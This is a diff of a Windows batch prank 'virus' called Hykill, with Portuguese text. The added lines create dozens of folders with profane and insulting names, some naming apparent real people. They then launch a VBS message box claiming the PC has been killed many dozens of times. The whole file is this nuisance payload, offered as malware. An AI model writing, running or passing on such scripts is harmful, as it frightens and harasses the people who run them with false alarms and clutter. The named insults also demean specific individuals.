@@ -1,8 +1,107 @@
 @echo off
 echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
 Start hahahahahahahahahahahah.txt
-start https://www.google.com/search?client=opera&q=Malwers&sourceid=opera&ie=UTF-8&oe=UTF-8
-start https://www.bing.com/search?q=Memz+trojan&qs=n&form=QBRE&sp=-1&ghc=2&lq=0&pq=memz+trojan&sc=11-11&sk=&cvid=C61B8060DD13413397FB14ECA316EB6D&ghsh=0&ghacc=0&ghpl=
+Md AHAHAHAHAHHAHAHAH
+Md trojan Hykill
+md hahahaha
+md deep web
+md sou guei kk
+md SUS
+Md EduardozinYT
+md your pc is fucked
+md seu pc foi fodido
+md Otario
+md hahahahahhahahah
+md hahahahahhahaha
+md ahahhahahaha
+md Miguel P
+md raphael marinho
+md Seu bosta
+md otario
+md your pc is fucked
+md seu pc foi fodido
+md your pc is fucked
+md seu pc foi fodido
+md your pc is fucked
+md seu pc foi fodido
+md your pc is fucked
+md seu pc foi fodido
+md your pc is fucked
+md seu pc foi fodido
+md your pc is fucked
+md seu pc foi fodido
+echo MsgBox "Hykill matou seu pc",16,"HAHAHAHAHAHHAHAHAH" > Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+echo MsgBox "Hykill matou seu pc",16,"HAHAHAHAHAHHAHAHAH" > Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+echo MsgBox "Hykill matou seu pc",16,"HAHAHAHAHAHHAHAHAH" > Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
 echo MsgBox "Hykill matou seu pc",16,"HAHAHAHAHAHHAHAHAH" > Hykill.vbs
 Start Hykill.vbs
 Start Hykill.vbs
